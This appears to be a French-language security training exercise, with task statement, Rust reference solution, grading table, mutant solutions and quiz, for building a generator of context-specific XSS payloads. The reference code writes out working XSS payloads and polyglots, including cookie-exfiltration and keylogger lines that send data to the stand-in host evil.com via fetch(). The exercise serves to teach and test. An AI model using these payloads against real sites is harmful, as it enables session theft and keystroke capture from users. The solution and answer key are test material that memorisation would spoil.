# Exercice 3.3.4-a : xss_payload_craftsman

**Module :**
3.3.4 â€” Cross-Site Scripting AvancÃ©

**Concept :**
a â€” CrÃ©ation de Payloads XSS Contextuels

**DifficultÃ© :**
â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜†â˜† (8/10)

**Type :**
code

**Tiers :**
2 â€” MÃ©lange (concepts a + b + c + e + f + j)

**Langage :**
Rust Edition 2024

**PrÃ©requis :**
- 3.3.3.g : WAF Bypass Techniques
- HTML/CSS/JavaScript fundamentals
- DOM API basics

**Domaines :**
Net, Encodage, Crypto

**DurÃ©e estimÃ©e :**
300 min (5h)

**XP Base :**
400

**ComplexitÃ© :**
T2 O(nÃ—m) Ã— S2 O(n)

---

## ğŸ“ SECTION 1 : PROTOTYPE & CONSIGNE

### 1.1 Obligations

**Fichier Ã  rendre :**
`xss_payload_craftsman.rs`

**Fonctions autorisÃ©es :**
- `serde_json` : parsing JSON
- `regex` : pattern matching
- `html_escape` : encoding HTML entities
- `std::collections::{HashMap, HashSet}`

**Fonctions interdites :**
- ExÃ©cution de JavaScript rÃ©el
- `unsafe` blocks
- RequÃªtes rÃ©seau

### 1.2 Consigne

#### ğŸ¬ CONTEXTE FUN â€” "Fight Club : Breaking Out of Context"

*"The first rule of Fight Club is: you do not talk about Fight Club. The second rule of Fight Club is: you DO NOT talk about Fight Club."* â€” Tyler Durden

Dans Fight Club, Tyler brise les rÃ¨gles de la sociÃ©tÃ©. En XSS, tu dois **briser les rÃ¨gles du contexte HTML** pour injecter ton code.

Le navigateur est un "gentleman" qui fait confiance au HTML. Mais toi, comme Tyler, tu sais que **tout est une question de contexte**. Un `<` dans du HTML est un tag. Un `<` dans un attribut `value=""` est juste du texte. Savoir DANS QUEL CONTEXTE tu te trouves est la clÃ©.

**"I want you to escape as hard as you can."** â€” Le contexte HTML ne s'attend pas Ã  ton payload.

**Ta mission :**

Ã‰crire une fonction `xss_payload_craftsman` qui analyse un contexte d'injection et gÃ©nÃ¨re des payloads XSS optimaux.

**EntrÃ©e :**
- `input_json` : chaÃ®ne JSON contenant :
  - `injection_context` : type de contexte (`"HTML_BODY"`, `"HTML_ATTRIBUTE_QUOTED"`, `"HTML_ATTRIBUTE_UNQUOTED"`, `"JAVASCRIPT_STRING"`, `"JAVASCRIPT_TEMPLATE"`, `"URL_PARAM"`, `"CSS_VALUE"`)
  - `surrounding_code` : le HTML/JS autour du point d'injection (avec `USER_INPUT` comme placeholder)
  - `filters[]` : caractÃ¨res/mots filtrÃ©s
  - `csp` : Content-Security-Policy header (optionnel)
  - `target_action` : action souhaitÃ©e (`"ALERT"`, `"COOKIE_EXFILTRATION"`, `"KEYLOGGER"`, `"REDIRECT"`, `"DOM_MANIPULATION"`)

**Sortie :**
- JSON avec :
  - `context_analysis` : type dÃ©tectÃ©, escape chars, vecteurs viables
  - `payloads[]` : liste de payloads avec technique et probabilitÃ©
  - `csp_analysis` : analyse CSP et bypasses possibles
  - `polyglot` : payload fonctionnant dans plusieurs contextes

**Exemples :**

| Context | Input | Payload |
|---------|-------|---------|
| HTML_BODY | `<div>USER_INPUT</div>` | `<img src=x onerror=alert(1)>` |
| ATTR_QUOTED | `<a href="USER_INPUT">` | `" onclick=alert(1) x="` |
| JS_STRING | `var x = 'USER_INPUT';` | `'; alert(1); '` |

### 1.3 Prototype

```rust
use serde::{Deserialize, Serialize};

pub fn xss_payload_craftsman(input_json: &str) -> String

#[derive(Debug, Deserialize)]
pub struct XssChallenge {
    pub injection_context: InjectionContext,
    pub surrounding_code: String,
    #[serde(default)]
    pub filters: Vec<String>,
    #[serde(default)]
    pub csp: Option<String>,
    pub target_action: TargetAction,
}

#[derive(Debug, Deserialize, Clone, PartialEq)]
pub enum InjectionContext {
    HTML_BODY,
    HTML_ATTRIBUTE_QUOTED,
    HTML_ATTRIBUTE_UNQUOTED,
    HTML_COMMENT,
    JAVASCRIPT_STRING,
    JAVASCRIPT_TEMPLATE,
    URL_PARAM,
    CSS_VALUE,
}

#[derive(Debug, Deserialize, Clone)]
pub enum TargetAction {
    ALERT,
    COOKIE_EXFILTRATION,
    KEYLOGGER,
    REDIRECT,
    DOM_MANIPULATION,
}

#[derive(Debug, Serialize)]
pub struct XssResult {
    pub context_analysis: ContextAnalysis,
    pub payloads: Vec<XssPayload>,
    pub csp_analysis: Option<CspAnalysis>,
    pub polyglot: Option<String>,
}

#[derive(Debug, Serialize)]
pub struct ContextAnalysis {
    pub detected_type: String,
    pub escape_chars: Vec<String>,
    pub viable_vectors: Vec<String>,
}

#[derive(Debug, Serialize)]
pub struct XssPayload {
    pub payload: String,
    pub bypass_technique: String,
    pub success_probability: String,
}

#[derive(Debug, Serialize)]
pub struct CspAnalysis {
    pub vulnerable: bool,
    pub reason: String,
    pub bypass_possible: bool,
    pub stricter_csp: String,
}
```

---

## ğŸ’¡ SECTION 2 : LE SAVIEZ-VOUS ?

### 2.1 L'Ã‰volution du XSS

| AnnÃ©e | Type | Description |
|-------|------|-------------|
| 2000 | Reflected XSS | Premier type documentÃ© |
| 2005 | Stored XSS | Samy Worm (MySpace) |
| 2010 | DOM-based XSS | Manipulation JS-only |
| 2015 | mXSS | Mutation XSS (innerHTML) |
| 2020 | CSP Bypass | Techniques sophistiquÃ©es |

### 2.2 Contextes d'Injection

```
                    CONTEXTES XSS
                         â”‚
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚                    â”‚                    â”‚
  HTML               JAVASCRIPT             CSS
    â”‚                    â”‚                    â”‚
â”Œâ”€â”€â”€â”´â”€â”€â”€â”          â”Œâ”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”             â”‚
â”‚       â”‚          â”‚           â”‚             â”‚
BODY   ATTR      STRING    TEMPLATE       VALUE
```

---

## ğŸ–¥ï¸ SECTION 3 : EXEMPLE D'UTILISATION

### 3.0 Session bash

```bash
$ cargo run
=== Fight Club XSS Craftsman v1.0 ===

[TEST 1] HTML_BODY context...
Context: <div>USER_INPUT</div>
Payload: <img src=x onerror=alert(1)>
âœ“ PASS

[TEST 2] Quoted attribute...
Context: <input value="USER_INPUT">
Payload: " onfocus=alert(1) autofocus x="
âœ“ PASS

[TEST 3] JavaScript string...
Context: var x = 'USER_INPUT';
Payload: '; alert(1); '
âœ“ PASS

=== Results: 12/12 tests passed ===
```

---

## âœ…âŒ SECTION 4 : ZONE CORRECTION

### 4.1 Moulinette

| Test ID | Description | Points |
|---------|-------------|--------|
| `T01` | HTML_BODY basic | 10 |
| `T02` | Attribute quoted | 10 |
| `T03` | Attribute unquoted | 10 |
| `T04` | JS string escape | 10 |
| `T05` | JS template literal | 10 |
| `T06` | URL context | 10 |
| `T07` | Filter bypass | 15 |
| `T08` | CSP analysis | 10 |
| `T09` | Cookie exfil payload | 10 |
| `T10` | Polyglot generation | 15 |
| `T11` | NULL input | 5 |
| `T12` | Invalid context | 5 |

### 4.3 Solution de rÃ©fÃ©rence

```rust
use serde::{Deserialize, Serialize};
use std::collections::HashSet;

#[derive(Debug, Deserialize)]
pub struct XssChallenge {
    pub injection_context: String,
    pub surrounding_code: String,
    #[serde(default)]
    pub filters: Vec<String>,
    #[serde(default)]
    pub csp: Option<String>,
    pub target_action: String,
}

#[derive(Debug, Serialize)]
pub struct XssResult {
    pub context_analysis: ContextAnalysis,
    pub payloads: Vec<XssPayload>,
    pub csp_analysis: Option<CspAnalysis>,
    pub polyglot: Option<String>,
}

#[derive(Debug, Serialize)]
pub struct ContextAnalysis {
    pub detected_type: String,
    pub escape_chars: Vec<String>,
    pub viable_vectors: Vec<String>,
}

#[derive(Debug, Serialize)]
pub struct XssPayload {
    pub payload: String,
    pub bypass_technique: String,
    pub success_probability: String,
}

#[derive(Debug, Serialize)]
pub struct CspAnalysis {
    pub vulnerable: bool,
    pub reason: String,
    pub bypass_possible: bool,
    pub stricter_csp: String,
}

#[derive(Debug, Serialize)]
pub struct ErrorResult {
    pub error: String,
}

pub fn xss_payload_craftsman(input_json: &str) -> String {
    if input_json.trim().is_empty() || input_json.trim() == "null" {
        return serde_json::to_string(&ErrorResult {
            error: "NULL_INPUT".to_string(),
        }).unwrap();
    }

    let challenge: XssChallenge = match serde_json::from_str(input_json) {
        Ok(c) => c,
        Err(e) => return serde_json::to_string(&ErrorResult {
            error: format!("PARSE_ERROR: {}", e),
        }).unwrap(),
    };

    let context_analysis = analyze_context(&challenge);
    let payloads = generate_payloads(&challenge, &context_analysis);
    let csp_analysis = analyze_csp(&challenge.csp);
    let polyglot = generate_polyglot(&challenge.filters);

    let result = XssResult {
        context_analysis,
        payloads,
        csp_analysis,
        polyglot: Some(polyglot),
    };

    serde_json::to_string_pretty(&result).unwrap()
}

fn analyze_context(challenge: &XssChallenge) -> ContextAnalysis {
    let (escape_chars, viable_vectors) = match challenge.injection_context.as_str() {
        "HTML_BODY" => (
            vec!["<".into(), ">".into()],
            vec!["script_tag".into(), "img_onerror".into(), "svg_onload".into()]
        ),
        "HTML_ATTRIBUTE_QUOTED" => (
            vec!["\"".into()],
            vec!["quote_escape".into(), "event_handler".into()]
        ),
        "HTML_ATTRIBUTE_UNQUOTED" => (
            vec![" ".into(), ">".into(), "/".into()],
            vec!["space_escape".into(), "new_attribute".into()]
        ),
        "JAVASCRIPT_STRING" => (
            vec!["'".into(), "\"".into(), "\\".into()],
            vec!["string_break".into(), "template_literal".into()]
        ),
        "JAVASCRIPT_TEMPLATE" => (
            vec!["`".into(), "${".into()],
            vec!["template_expression".into()]
        ),
        "URL_PARAM" => (
            vec!["javascript:".into()],
            vec!["protocol_handler".into(), "data_uri".into()]
        ),
        "CSS_VALUE" => (
            vec!["expression(".into(), "url(".into()],
            vec!["expression_injection".into()]
        ),
        _ => (vec![], vec!["unknown".into()])
    };

    ContextAnalysis {
        detected_type: challenge.injection_context.clone(),
        escape_chars,
        viable_vectors,
    }
}

fn generate_payloads(challenge: &XssChallenge, context: &ContextAnalysis) -> Vec<XssPayload> {
    let filtered: HashSet<String> = challenge.filters.iter()
        .map(|f| f.to_lowercase())
        .collect();

    let mut payloads = Vec::new();
    let action_code = get_action_code(&challenge.target_action);

    match challenge.injection_context.as_str() {
        "HTML_BODY" => {
            if !filtered.contains("<") && !filtered.contains("script") {
                payloads.push(XssPayload {
                    payload: format!("<script>{}</script>", action_code),
                    bypass_technique: "Direct script injection".into(),
                    success_probability: "HIGH".into(),
                });
            }
            if !filtered.contains("<") {
                payloads.push(XssPayload {
                    payload: format!("<img src=x onerror={}>", action_code),
                    bypass_technique: "IMG onerror event".into(),
                    success_probability: "HIGH".into(),
                });
                payloads.push(XssPayload {
                    payload: format!("<svg/onload={}>", action_code),
                    bypass_technique: "SVG onload event".into(),
                    success_probability: "HIGH".into(),
                });
            }
        }
        "HTML_ATTRIBUTE_QUOTED" => {
            payloads.push(XssPayload {
                payload: format!("\" onfocus={} autofocus x=\"", action_code),
                bypass_technique: "Quote escape + event handler".into(),
                success_probability: "HIGH".into(),
            });
            payloads.push(XssPayload {
                payload: format!("\"><img src=x onerror={}>", action_code),
                bypass_technique: "Break out of attribute and tag".into(),
                success_probability: "MEDIUM".into(),
            });
        }
        "HTML_ATTRIBUTE_UNQUOTED" => {
            payloads.push(XssPayload {
                payload: format!(" onfocus={} autofocus ", action_code),
                bypass_technique: "Space injection + event handler".into(),
                success_probability: "HIGH".into(),
            });
        }
        "JAVASCRIPT_STRING" => {
            payloads.push(XssPayload {
                payload: format!("'; {}; '", action_code),
                bypass_technique: "Single quote string break".into(),
                success_probability: "HIGH".into(),
            });
            payloads.push(XssPayload {
                payload: format!("\"; {}; \"", action_code),
                bypass_technique: "Double quote string break".into(),
                success_probability: "HIGH".into(),
            });
        }
        "JAVASCRIPT_TEMPLATE" => {
            payloads.push(XssPayload {
                payload: format!("${{{}}}",  action_code),
                bypass_technique: "Template literal expression".into(),
                success_probability: "HIGH".into(),
            });
        }
        "URL_PARAM" => {
            payloads.push(XssPayload {
                payload: format!("javascript:{}", action_code),
                bypass_technique: "JavaScript protocol".into(),
                success_probability: "MEDIUM".into(),
            });
            payloads.push(XssPayload {
                payload: format!("data:text/html,<script>{}</script>", action_code),
                bypass_technique: "Data URI".into(),
                success_probability: "LOW".into(),
            });
        }
        _ => {}
    }

    payloads
}

fn get_action_code(action: &str) -> String {
    match action {
        "ALERT" => "alert(1)".into(),
        "COOKIE_EXFILTRATION" => "fetch('https://evil.com/?c='+document.cookie)".into(),
        "KEYLOGGER" => "document.onkeypress=e=>fetch('https://evil.com/?k='+e.key)".into(),
        "REDIRECT" => "location='https://evil.com'".into(),
        "DOM_MANIPULATION" => "document.body.innerHTML='pwned'".into(),
        _ => "alert(1)".into(),
    }
}

fn analyze_csp(csp: &Option<String>) -> Option<CspAnalysis> {
    let csp_str = csp.as_ref()?;

    let vulnerable = csp_str.contains("unsafe-inline") ||
                     csp_str.contains("unsafe-eval") ||
                     csp_str.contains("*");

    let reason = if csp_str.contains("unsafe-inline") {
        "unsafe-inline allows inline scripts and event handlers"
    } else if csp_str.contains("unsafe-eval") {
        "unsafe-eval allows eval() and similar"
    } else if csp_str.contains("*") {
        "Wildcard allows scripts from any origin"
    } else {
        "CSP appears properly configured"
    };

    Some(CspAnalysis {
        vulnerable,
        reason: reason.into(),
        bypass_possible: vulnerable,
        stricter_csp: "default-src 'self'; script-src 'nonce-RANDOM'; style-src 'self'".into(),
    })
}

fn generate_polyglot(filters: &[String]) -> String {
    // Universal XSS polyglot that works in multiple contexts
    let filtered: HashSet<String> = filters.iter().map(|f| f.to_lowercase()).collect();

    if filtered.is_empty() {
        return "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//".into();
    }

    // Simplified polyglot if filters present
    "'-alert(1)-'".into()
}
```

### 4.10 Solutions Mutantes (6 minimum)

#### Mutant A (Boundary) : Ignore le contexte URL

```rust
fn generate_payloads_mutant_a(challenge: &XssChallenge, _: &ContextAnalysis) -> Vec<XssPayload> {
    // BUG: Traite URL_PARAM comme HTML_BODY
    vec![XssPayload {
        payload: "<script>alert(1)</script>".into(),
        bypass_technique: "Direct".into(),
        success_probability: "HIGH".into(),
    }]
}
// Faux: <script> dans un href ne s'exÃ©cute pas
```

#### Mutant B (Safety) : Crash sur CSP null

```rust
fn analyze_csp_mutant_b(csp: &Option<String>) -> Option<CspAnalysis> {
    let csp_str = csp.as_ref().unwrap(); // BUG: panic si None
    // ...
}
```

#### Mutant C (Logic) : ProbabilitÃ© inversÃ©e

```rust
fn generate_payloads_mutant_c(...) -> Vec<XssPayload> {
    XssPayload {
        // BUG: HIGH quand Ã§a devrait Ãªtre LOW
        success_probability: if filtered.len() > 5 { "HIGH" } else { "LOW" }.into(),
    }
}
```

#### Mutant D (Return) : Toujours alert(1)

```rust
fn get_action_code_mutant_d(_action: &str) -> String {
    "alert(1)".into() // BUG: Ignore target_action
}
```

#### Mutant E (Edge) : Pas de polyglot si filtres

```rust
fn generate_polyglot_mutant_e(filters: &[String]) -> String {
    if !filters.is_empty() {
        return String::new(); // BUG: Retourne vide au lieu d'adapter
    }
    // ...
}
```

#### Mutant F (Resource) : GÃ©nÃ¨re trop de payloads

```rust
fn generate_payloads_mutant_f(...) -> Vec<XssPayload> {
    let mut payloads = Vec::new();
    for i in 0..1000 { // BUG: Boucle excessive
        payloads.push(XssPayload { /* ... */ });
    }
    payloads
}
```

---

## ğŸ§  SECTION 5 : COMPRENDRE

### 5.1 Taxonomie des Contextes XSS

```
CONTEXTE               ESCAPE CHAR    PAYLOAD TYPE
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
HTML Body              < >            <script>, <img>
Attribut Quoted        "              " event="
Attribut Unquoted      SPACE >        event=
JS String              ' "            '; code; '
JS Template            ` ${           ${code}
URL                    :              javascript:
CSS                    ( )            expression()
```

### 5.3 Visualisation ASCII

```
                      INJECTION POINT
                           â”‚
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚                      â”‚                      â”‚
    â–¼                      â–¼                      â–¼
<div>USER_INPUT</div>   href="USER"    var x='USER'
    â”‚                      â”‚                  â”‚
    â–¼                      â–¼                  â–¼
<img onerror>          " onclick="      '; alert(); '
```

### 5.8 MnÃ©motechniques

#### ğŸ¥Š MEME : "Fight Club - Context Breaking"

*"You are not your context. You are not your quotation marks."*

En XSS, le contexte te dÃ©finit. Mais comme Tyler Durden, tu peux **casser les rÃ¨gles du contexte** :

```
Context: <div class="USER_INPUT">
You think: Je suis dans un attribut quoted
Tyler: "Tu n'es pas tes guillemets" â†’ "><script>
```

---

## ğŸ“ SECTION 7 : QCM

### Question 1
**Dans quel contexte `"><img src=x onerror=alert(1)>` fonctionne?**
- A) HTML_BODY
- B) HTML_ATTRIBUTE_QUOTED
- C) JAVASCRIPT_STRING
- D) URL_PARAM

**RÃ©ponse : B**

### Question 2
**Que signifie `unsafe-inline` dans CSP?**
- A) Bloque tous les scripts inline
- B) Autorise les scripts inline et event handlers
- C) Autorise uniquement eval()
- D) Bloque les scripts externes

**RÃ©ponse : B**

### Question 3
**Quel payload fonctionne dans un attribut UNQUOTED?**
- A) `"><script>`
- B) `' onclick=`
- C) `SPACE onfocus=alert(1)`
- D) `${alert(1)}`

**RÃ©ponse : C**

---

## ğŸ“¦ SECTION 9 : DEPLOYMENT PACK

```json
{
  "deploy": {
    "hackbrain_version": "5.5.2",
    "exercise_slug": "3.3.4-a-xss-payload-craftsman",
    "metadata": {
      "exercise_id": "3.3.4-a",
      "difficulty": 8,
      "language": "rust",
      "duration_minutes": 300,
      "xp_base": 400,
      "meme_reference": "Fight Club"
    },
    "cwe_mapping": {
      "primary": "CWE-79",
      "owasp": "A03:2021-Injection"
    }
  }
}
```

---

*HACKBRAIN v5.5.2 â€” XSS Payload Craftsman*
*"The first rule of XSS Club: escape your context"*